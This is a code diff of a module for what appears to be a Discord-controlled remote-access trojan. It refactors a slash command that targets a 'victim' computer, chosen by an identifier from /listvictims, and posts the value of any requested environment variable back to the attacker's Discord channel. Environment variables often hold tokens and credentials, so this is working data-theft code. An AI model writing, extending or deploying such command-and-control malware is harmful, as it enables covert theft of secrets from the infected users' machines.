@@ -8,17 +8,17 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class GetEnvironment(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Finds the values of environment variables",
-        options=[
-            bot.victim,
-            discord.Option("environment", description="The variable of which the value is wanted", required=True)
-        ],
-    )
+    @commands.slash_command( )
     async def get_environment(self, ctx, victim: str, environment: str):
-        if str(victim) == str(self.ip_addr):
+        """Finds the values of environment values
+        
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        environment: The variable of which the value is wanted
+        """
+        if str(victim) == str(self.bot.identifier):
             try: 
                 value = os.getenv(environment)
             except: 
@@ -37,11 +37,22 @@ class GetEnvironment(commands.Cog):
                     )
                 )
                 
+            if value == "":
+                return await ctx.response.send_message(
+                    embed=self.bot.genEmbed(
+                        "Variable's value is empty!", 
+                        datetime.now()
+                    )
+                )
+                
             if len(value) >= 1023:
                 return await ctx.response.send_message(f"The value for {environment} is:\n```{value}```")
                 
             await ctx.response.send_message(
-                embed = self.bot.genEmbed( f"Found environment variable", datetime.now() ).add_field(
+                embed = self.bot.genEmbed( 
+                    f"Found environment variable", 
+                    datetime.now() 
+                ).add_field(
                     name="Value for "+environment+" is:", 
                     value="```"+value+"```"
                 )
